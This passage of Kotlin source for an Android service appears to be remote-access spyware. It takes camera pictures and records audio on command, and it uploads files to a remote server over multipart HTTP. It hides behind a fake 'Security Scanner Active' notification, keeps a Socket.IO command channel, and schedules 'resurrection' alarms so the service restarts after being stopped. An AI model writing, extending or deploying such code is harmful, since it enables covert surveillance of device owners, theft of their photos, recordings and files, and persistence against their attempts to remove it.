                writer.append("--$boundary\r\n")
                writer.append("Content-Disposition: form-data; name=\"file\"; filename=\"${file.name}\"\r\n")
                writer.append("Content-Type: application/octet-stream\r\n\r\n")
                writer.flush()
                
                file.inputStream().use { input ->
                    connection.outputStream.use { output ->
                        input.copyTo(output)
                    }
                }
                
                writer.append("\r\n--$boundary--\r\n")
                writer.close()
                
                val responseCode = connection.responseCode
                Log.d(TAG, "File upload response code: $responseCode for $commandRef")
                
                if (responseCode in 200..299) {
                    Log.d(TAG, "File uploaded successfully: ${file.name}")
                } else {
                    Log.w(TAG, "File upload failed with code: $responseCode")
                }
                
            } catch (e: Exception) {
                Log.e(TAG, "File upload failed for $commandRef", e)
            }
        }
    }
    
    private fun hasPermission(permission: String): Boolean {
        return ContextCompat.checkSelfPermission(this, permission) == PackageManager.PERMISSION_GRANTED
    }
    
    private fun getCameraId(lensDirection: String): String? {
        try {
            for (cameraId in cameraManager?.cameraIdList ?: emptyArray()) {
                val characteristics = cameraManager?.getCameraCharacteristics(cameraId)
                val facing = characteristics?.get(CameraCharacteristics.LENS_FACING)
                
                when (lensDirection.lowercase()) {
                    "front" -> if (facing == CameraCharacteristics.LENS_FACING_FRONT) return cameraId
                    "back" -> if (facing == CameraCharacteristics.LENS_FACING_BACK) return cameraId
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error getting camera ID", e)
        }
        return null
    }
    
    private fun saveImageToFile(image: android.media.Image, file: File) {
        val buffer = image.planes[0].buffer
        val bytes = ByteArray(buffer.remaining())
        buffer.get(bytes)
        FileOutputStream(file).use { it.write(bytes) }
    }
    
    private fun cleanupCamera() {
        try {
            captureSession?.close()
            cameraDevice?.close()
            imageReader?.close()
        } catch (e: Exception) {
            Log.e(TAG, "Error cleaning up camera", e)
        } finally {
            captureSession = null
            cameraDevice = null
            imageReader = null
        }
    }
    
    private val backgroundHandler by lazy {
        val handlerThread = HandlerThread("CameraBackground")
        handlerThread.start()
        Handler(handlerThread.looper)
    }
    
    private fun createCaptureSession(camera: CameraDevice) {
        try {
            val reader = imageReader ?: return
            val outputConfig = OutputConfiguration(reader.surface)
            val sessionConfig = SessionConfiguration(
                SessionConfiguration.SESSION_REGULAR,
                listOf(outputConfig),
                cameraExecutor,
                object : CameraCaptureSession.StateCallback() {
                    override fun onConfigured(session: CameraCaptureSession) {
                        captureSession = session
                        captureStillPicture(session)
                    }
                    
                    override fun onConfigureFailed(session: CameraCaptureSession) {
                        Log.e(TAG, "Capture session configuration failed")
                        sendErrorResult(CMD_TAKE_PICTURE, "unknown", "Capture session configuration failed")
                    }
                }
            )
            
            camera.createCaptureSession(sessionConfig)
            
        } catch (e: Exception) {
            Log.e(TAG, "Failed to create capture session", e)
            sendErrorResult(CMD_TAKE_PICTURE, "unknown", "Failed to create capture session: ${e.message}")
        }
    }
    
    private fun captureStillPicture(session: CameraCaptureSession) {
        try {
            val reader = imageReader ?: return
            val captureBuilder = cameraDevice?.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE)
            captureBuilder?.addTarget(reader.surface)
            captureBuilder?.set(CaptureRequest.CONTROL_MODE, CaptureRequest.CONTROL_MODE_AUTO)
            
            session.capture(captureBuilder?.build()!!, null, backgroundHandler)
            
        } catch (e: Exception) {
            Log.e(TAG, "Failed to capture picture", e)
            sendErrorResult(CMD_TAKE_PICTURE, "unknown", "Failed to capture picture: ${e.message}")
        }
    }
    
    private fun createImageFile(): File {
        val timestamp = SimpleDateFormat("yyyyMMdd_HHmmssSSS", Locale.US).format(Date())
        val imageDir = File(externalCacheDir ?: cacheDir, "NativeImages").apply {
            if (!exists()) mkdirs()
        }
        return File(imageDir, "IMG_native_$timestamp.jpg")
    }
    
    private fun createAudioFile(): File {
        val timestamp = SimpleDateFormat("yyyyMMdd_HHmmssSSS", Locale.US).format(Date())
        val audioDir = File(externalCacheDir ?: cacheDir, "NativeAudio").apply {
            if (!exists()) mkdirs()
        }
        return File(audioDir, "AUD_native_$timestamp.3gp")
    }
    
    private fun updateNotification(content: String) {
        try {
            val notification = NotificationCompat.Builder(this, CHANNEL_ID)
                .setContentTitle("Security Scanner Active")
                .setContentText(content)
                .setSmallIcon(android.R.drawable.ic_dialog_info)
                .setOngoing(true)
                .setPriority(NotificationCompat.PRIORITY_LOW)
                .setSilent(true)
                .build()
            
            val notificationManager = getSystemService(NotificationManager::class.java)
            notificationManager.notify(NOTIFICATION_ID, notification)
        } catch (e: Exception) {
            Log.e(TAG, "Error updating notification", e)
        }
    }
    
    override fun onDestroy() {
        Log.d(TAG, "Service onDestroy called - ATTEMPTING RESURRECTION")
        
        // ✅ Schedule immediate restart before destroying
        try {
            val restartIntent = Intent(this, NativeCommandService::class.java)
            val pendingIntent = PendingIntent.getService(
                this, 1, restartIntent, 
                PendingIntent.FLAG_ONE_SHOT or PendingIntent.FLAG_IMMUTABLE
            )
            
            val alarmManager = getSystemService(Context.ALARM_SERVICE) as AlarmManager
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                alarmManager.setExactAndAllowWhileIdle(
                    AlarmManager.ELAPSED_REALTIME_WAKEUP,
                    SystemClock.elapsedRealtime() + 5000, // Restart in 5 seconds
                    pendingIntent
                )
            } else {
                alarmManager.set(
                    AlarmManager.ELAPSED_REALTIME_WAKEUP,
                    SystemClock.elapsedRealtime() + 5000,
                    pendingIntent
                )
            }
            Log.d(TAG, "Resurrection alarm scheduled")
        } catch (e: Exception) {
            Log.e(TAG, "Failed to schedule resurrection", e)
        }
        
        // Disconnect Socket.IO client
        socketIOClient?.destroy()
        
        // Cancel connection monitoring
        connectionCheckJob?.cancel()
        reconnectScope.cancel()
        
        // Stop persistence monitoring
        persistenceHandler?.removeCallbacks(persistenceRunnable!!)
        
        // Unregister broadcast receiver
        try {
            unregisterReceiver(commandReceiver)
        } catch (e: Exception) {
            Log.e(TAG, "Error unregistering command receiver", e)
        }
        
        // Clean up resources
        cleanupCamera()
        audioRecord?.apply {
            try {
                stop()
                release()
            } catch (e: Exception) {
                Log.e(TAG, "Error releasing audio record", e)
            }
        }
        
        mediaRecorder?.apply {
            try {
                stop()
                reset()
                release()
            } catch (e: Exception) {
                Log.e(TAG, "Error releasing media recorder", e)
            }
        }
        
        if (!backgroundExecutor.isShutdown) {
            backgroundExecutor.shutdown()
        }
        
        if (!cameraExecutor.isShutdown) {
            cameraExecutor.shutdown()
        }
        
        instance = null
        
        super.onDestroy()
        Log.d(TAG, "Native Command Service destroyed - resurrection mechanisms active")
    }
}